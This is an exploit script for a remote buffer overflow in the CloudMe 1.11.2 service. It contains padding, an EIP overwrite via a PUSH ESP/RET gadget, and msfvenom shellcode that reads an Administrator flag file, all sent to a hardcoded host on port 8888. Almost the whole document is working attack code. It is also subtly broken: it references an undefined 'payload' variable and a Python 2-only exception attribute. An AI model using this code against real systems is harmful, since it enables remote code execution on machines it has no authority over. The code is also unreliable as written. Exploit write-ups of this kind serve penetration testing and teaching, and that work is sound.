# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket,sys

target = "10.10.10.198"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD='type c:\Users\Administrator\Desktop\root.txt' -b '\x00\x0A\x0D' -f python
buf = b"\xda\xcc\xb8\x48\x9d\x7e\x78\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x3a\x31\x43\x18\x83\xeb\xfc\x03\x43\x5c\x7f"
buf += b"\x8b\x84\xb4\xfd\x74\x75\x44\x62\xfc\x90\x75\xa2\x9a"
buf += b"\xd1\x25\x12\xe8\xb4\xc9\xd9\xbc\x2c\x5a\xaf\x68\x42"
buf += b"\xeb\x1a\x4f\x6d\xec\x37\xb3\xec\x6e\x4a\xe0\xce\x4f"
buf += b"\x85\xf5\x0f\x88\xf8\xf4\x42\x41\x76\xaa\x72\xe6\xc2"
buf += b"\x77\xf8\xb4\xc3\xff\x1d\x0c\xe5\x2e\xb0\x07\xbc\xf0"
buf += b"\x32\xc4\xb4\xb8\x2c\x09\xf0\x73\xc6\xf9\x8e\x85\x0e"
buf += b"\x30\x6e\x29\x6f\xfd\x9d\x33\xb7\x39\x7e\x46\xc1\x3a"
buf += b"\x03\x51\x16\x41\xdf\xd4\x8d\xe1\x94\x4f\x6a\x10\x78"
buf += b"\x09\xf9\x1e\x35\x5d\xa5\x02\xc8\xb2\xdd\x3e\x41\x35"
buf += b"\x32\xb7\x11\x12\x96\x9c\xc2\x3b\x8f\x78\xa4\x44\xcf"
buf += b"\x23\x19\xe1\x9b\xc9\x4e\x98\xc1\x87\x91\x2e\x7c\xe5"
buf += b"\x92\x30\x7f\x59\xfb\x01\xf4\x36\x7c\x9e\xdf\x73\x72"
buf += b"\xd4\x42\xd5\x1b\xb1\x16\x64\x46\x42\xcd\xaa\x7f\xc1"
buf += b"\xe4\x52\x84\xd9\x8c\x57\xc0\x5d\x7c\x25\x59\x08\x82"
buf += b"\x9a\x5a\x19\xf6\x65\xd5\xc7\xd7\xf6\x2f\x54\x4d\x8b"
buf += b"\x2a\x16\x1e\x37\xf4\xb2\x8d\xae\x98\x53\x3d\x44\x17"
buf += b"\xc5\xb5\xcb\xa5\x59\x72\x76\x39\x09\x0e\x17\xcd\x91"
buf += b"\x9c\x88\x42\x5e\x4f\x22\xe5\xea\x8f"


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
            